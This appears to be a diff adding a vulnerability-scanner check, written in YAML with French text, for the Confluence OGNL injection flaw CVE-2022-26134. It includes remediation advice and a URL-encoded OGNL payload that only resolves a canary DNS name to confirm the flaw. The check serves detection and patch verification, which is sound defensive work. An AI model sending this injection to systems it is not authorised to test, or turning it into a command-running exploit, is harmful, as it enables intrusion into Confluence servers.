@@ -1,0 +1,28 @@
+id: confluence-ognl
+name: ConfluenceChecker
+version: 2.0.0
+author: OpenCVEC
+cves: [CVE-2022-26134]
+product: Atlassian Confluence Server / Data Center (avant 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1)
+description: Place dans l'URL une expression OGNL qui se borne à résoudre le nom du canari (InetAddress.getByName).
+mode: canary
+proof: Requête DNS sur le canari
+sent: '/${(#a=@java.net.InetAddress@getByName("<canari>"))}/ : aucune commande système n''est appelée.'
+remediation:
+  - Mettre Confluence à jour vers une version corrigée (7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1 ou plus).
+  - Rechercher des fichiers JSP ou des processus inattendus créés depuis juin 2022.
+  - Relancer le check pour confirmer la correction.
+references:
+  - https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
+tags: [confluence, java]
+lab_validated: false
+lab_note: "À valider en labo : l'image Confluence demande une licence d'évaluation."
+steps:
+  - id: ognl
+    http:
+      method: GET
+      path: "{{target.dir}}/%24%7B%28%23a%3D%40java.net.InetAddress%40getByName%28%22{{canary.dns.p1}}%22%29%29%7D/"
+    points:
+      p1: chemin de l'URL (espace de noms OGNL)
+proofs:
+  callback: true
